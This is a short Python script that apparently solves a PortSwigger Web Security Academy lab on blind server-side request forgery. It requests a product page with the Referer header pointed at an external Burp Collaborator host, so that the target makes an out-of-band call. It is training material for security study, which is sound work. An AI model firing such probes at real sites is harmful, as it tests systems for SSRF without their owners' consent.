"""
https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

url = f'https://{site}/product?productId=1'

s.get(url, headers={'referer' : "https://burpcollaborator.net"})